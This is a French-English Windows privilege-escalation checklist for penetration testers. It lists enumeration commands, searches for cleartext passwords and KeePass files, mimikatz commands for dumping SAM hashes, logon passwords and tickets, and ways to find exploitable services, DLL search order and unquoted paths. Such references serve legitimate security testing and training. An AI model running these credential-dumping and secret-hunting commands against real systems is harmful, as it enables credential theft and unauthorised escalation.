# Checklist Windows
  
**Hostname:** hostname  
**Infos utilisateur:** whoami /all  
**infos IP:** ipconfig /all  
**liste des connexions:** netstat -ano  
**infos system:** systeminfo  
**powershell-history:** type C:\Users\[user]\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt  
to verify the path of ConsoleHost_history: (Get-PSReadlineOption).HistorySavePath  
  
**list connected user:**  
query user  
  
**users and localgroups:**  
net users  
net localgroups  

**More info about a specific user:**  
net user [user]  
  
**View Domain Groups:**  
net group /domain  
  
**View Members of Domain Group:**  
net group /domain [Group Name]  

**lister user/groupe en powershell:**  
Get-LocalUser  
Get-LocalGroup  
Get-LocalGroupMember adminteam  
  
**process:**  
Get-Process  
tasklist /v  
  
**Logiciels installés:**  
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname  
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname  
  
**Firewall:**  
netsh firewall show state  
netsh firewall show config  

## Cleartext Passwords  
findstr /si password *.txt  
findstr /si password *.xml  
findstr /si password *.ini  
  
**Find all those strings in config files.**  
dir /s *pass* == *cred* == *vnc* == *.config*  
  
**Find all passwords in all files.**  
findstr /spin "password" *.*  
findstr /spin "password" *.*  

**Kepass File**  
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue  
  
All doc file :
Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue

## mimikatz.exe cheat sheet
privilege::debug  -->  engage the SeDebugPrivlege  
token::elevate + lsadump::sam --> Dump from SAM database  
sekurlsa::logonpasswords --> Dump from Sekurlsa  
sekurlsa::tickets --> Dump cached tickets  
Some source: https://chryzsh.gitbooks.io/pentestbook/content/privilege_escalation_windows.html  

## exploiter un service
**lister les services:** Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}  
**ou:** wmic service get name,pathname  
**Lister service modifiable:** Get-ModifiableServiceFile (PowerUp.ps1)  
**ou:** accesschk.exe /accepeula - accesschk.exe -uwcqv "user" *  
**infos sur un service:** SC.exe query <service>  
**démarer un sevice:** sc.exe start <service>  
**ou:** net start <service> / Start-Service <service>   
  
## DLL Hijacking 
Standard DLL search order on current Windows versions: 
1. The directory from which the application loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory.
5. The current directory.
6. The directories that are listed in the PATH environment variable.

## Unquoted Service Paths
**list service outsite Windows directory:** wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """  

## Scheduled Tasks
**List tasks:** schtasks /query /fo LIST /v  
